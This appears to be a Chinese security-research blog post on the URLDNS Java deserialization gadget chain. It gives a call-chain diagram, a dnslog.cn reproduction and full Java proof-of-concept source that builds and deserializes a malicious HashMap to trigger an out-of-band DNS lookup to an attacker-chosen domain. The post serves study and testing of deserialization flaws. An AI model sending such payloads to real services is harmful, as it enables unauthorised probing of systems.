+++
title = "Java反序列化-URLDNS"
date = 2026-06-14T22:35:00+08:00
draft = false
description = "由于很多框架是 Java 写的，所以研究 Java 安全刻不容缓。"
tags = ["Java安全", "安全研究"]
categories = ["安全研究"]
series = ["Java 安全 持续学习"]
pin = false
cover = "/images/posts/java-security-banner.svg"
+++
## 前言

由于很多框架是 Java 写的，所以研究 Java 安全刻不容缓。这篇文章收录在「Java 安全 持续学习」系列中，用来沉淀对应主题的分析与记录。

## 正文

## URLDNS

用来测试是否存在反序列化的探测器（盲打测试）


最终效果-触发目标服务器向指定地址发起一次DNS查询请求


优点：不需要第三方依赖，完全依赖Java原生库，不需要任何CC,spring等库。而且只要是Java环境，这条链子都能触发

## 原理

底层的触发栈

 URLDNS 调用链

  HashMap.readObject()
      │
      ▼
  HashMap.hash(key)
      │
      ▼
  key.hashCode()                    ← key 是 URL 对象
      │
      ▼
  URL.hashCode()
      │
      ▼
  URLStreamHandler.hashCode(url)
      │
      ▼
  URLStreamHandler.getHostAddress(url)
      │
      ▼
  InetAddress.getByName(host)       ← 发起 DNS 解析请求
      │
      ▼
  DNS 查询: evil.com → 攻击者服务器




## 搭建复现过程


到dns平台

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260610205254882.png)


域名

41vcw7.dnslog.cn

```c
java -cp target/urldns-poc-1.0-SNAPSHOT.jar com.urldns.URLDNSLocalTest 41vcw7.dnslog.cn
```

启动

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260610205420295.png)


发现已经有回显

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260610205446618.png)


源码

```java
package com.urldns;

  

import java.io.*;

import java.lang.reflect.Field;

import java.net.URL;

import java.util.HashMap;

  

/**

 * URLDNS 本地测试 - 无需服务器，直接在本地演示

 *

 * 这个程序会：

 * 1. 生成恶意序列化数据

 * 2. 保存到文件

 * 3. 反序列化触发 DNS 查询

 *

 * 使用方法：

 * java -cp target/urldns-poc-1.0-SNAPSHOT.jar com.urldns.URLDNSLocalTest <dnslog地址>

 * 例如：java -cp target/urldns-poc-1.0-SNAPSHOT.jar com.urldns.URLDNSLocalTest test.dnslog.cn

 */

public class URLDNSLocalTest {

  

    public static void main(String[] args) throws Exception {

        if (args.length < 1) {

            System.out.println("用法: java com.urldns.URLDNSLocalTest <dnslog地址>");

            System.out.println("例如: java com.urldns.URLDNSLocalTest test.dnslog.cn");

            System.out.println();

            System.out.println("可用的 DNSLog 平台:");

            System.out.println("  - http://dnslog.cn");

            System.out.println("  - http://ceye.io");

            System.out.println("  - http://dnslog.link");

            System.out.println("  - http://interactsh.com");

            return;

        }

  

        String dnslogDomain = args[0];

  

        System.out.println("═══════════════════════════════════════════════════════");

        System.out.println("           URLDNS 本地测试");

        System.out.println("═══════════════════════════════════════════════════════");

        System.out.println();

        System.out.println("[*] DNSLog 域名: " + dnslogDomain);

        System.out.println();

  

        // ========== 阶段1: 生成恶意序列化数据 ==========

        System.out.println("【阶段1】生成恶意序列化数据");

        System.out.println("─────────────────────────────────────────────────────");

  

        // 创建恶意 URL

        URL maliciousUrl = new URL("http://" + dnslogDomain);

        System.out.println("[*] 创建恶意 URL: " + maliciousUrl);

  

        // 创建 HashMap

        HashMap<URL, String> map = new HashMap<>();

  

        // 设置 URL 的 hashCode 为 -1（关键步骤！）

        // 这样在反序列化时会重新计算 hashCode，触发 DNS 查询

        setFieldValue(maliciousUrl, "hashCode", -1);

        System.out.println("[*] 设置 URL.hashCode = -1");

  

        // 将 URL 放入 HashMap（此时不会触发 DNS，因为 hashCode 已设置）

        map.put(maliciousUrl, "evil");

        System.out.println("[*] 将 URL 作为 key 放入 HashMap");

  

        // 重置 hashCode，确保反序列化时会重新计算

        setFieldValue(maliciousUrl, "hashCode", -1);

        System.out.println("[*] 重置 URL.hashCode = -1");

  

        System.out.println();

        System.out.println("[+] 恶意 HashMap 构造完成");

        System.out.println("    HashMap<" + maliciousUrl + ", \"evil\">");

        System.out.println();

  

        // ========== 阶段2: 序列化 ==========

        System.out.println("【阶段2】序列化恶意对象");

        System.out.println("─────────────────────────────────────────────────────");

  

        // 序列化到文件

        String payloadFile = "urldns_payload.bin";

        ByteArrayOutputStream baos = new ByteArrayOutputStream();

        ObjectOutputStream oos = new ObjectOutputStream(baos);

        oos.writeObject(map);

        oos.close();

  

        byte[] payload = baos.toByteArray();

  

        try (FileOutputStream fos = new FileOutputStream(payloadFile)) {

            fos.write(payload);

        }

  

        System.out.println("[+] 序列化完成");

        System.out.println("[+] Payload 大小: " + payload.length + " 字节");

        System.out.println("[+] 已保存到文件: " + payloadFile);

        System.out.println();

  

        // ========== 阶段3: 反序列化（触发 DNS 查询） ==========

        System.out.println("【阶段3】反序列化触发 DNS 查询");

        System.out.println("─────────────────────────────────────────────────────");

        System.out.println("[!] 即将反序列化，这将触发 DNS 查询...");

        System.out.println("[!] 请立即检查 DNSLog 平台！");

        System.out.println();

  

        // 等待用户确认

        System.out.println("按 Enter 键继续...");

        System.in.read();

  

        // 从文件读取并反序列化

        System.out.println("[*] 正在从文件读取 payload...");

        byte[] filePayload = java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(payloadFile));

  

        ByteArrayInputStream bais = new ByteArrayInputStream(filePayload);

        ObjectInputStream ois = new ObjectInputStream(bais);

  

        System.out.println("[*] 正在反序列化...");

        System.out.println("[!] 触发 URLDNS 链！");

        System.out.println();

  

        try {

            Object result = ois.readObject();  // ← 这里触发 DNS 查询！

            System.out.println("[+] 反序列化完成");

            System.out.println("[+] 对象类型: " + result.getClass().getName());

  

            if (result instanceof HashMap) {

                HashMap<?, ?> resultMap = (HashMap<?, ?>) result;

                System.out.println("[+] HashMap 大小: " + resultMap.size());

            }

        } catch (Exception e) {

            System.out.println("[!] 反序列化过程发生异常: " + e.getMessage());

        }

  

        ois.close();

  

        System.out.println();

        System.out.println("═══════════════════════════════════════════════════════");

        System.out.println("[*] URLDNS 链已触发");

        System.out.println("[*] 请检查 DNSLog 平台是否有 " + dnslogDomain + " 的解析记录");

        System.out.println("[*] 如果有记录，说明反序列化漏洞存在！");

        System.out.println("═══════════════════════════════════════════════════════");

    }

  

    /**

     * 通过反射设置对象字段值

     */

    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {

        Field field = obj.getClass().getDeclaredField(fieldName);

        field.setAccessible(true);

        field.set(obj, value);

    }

}
```
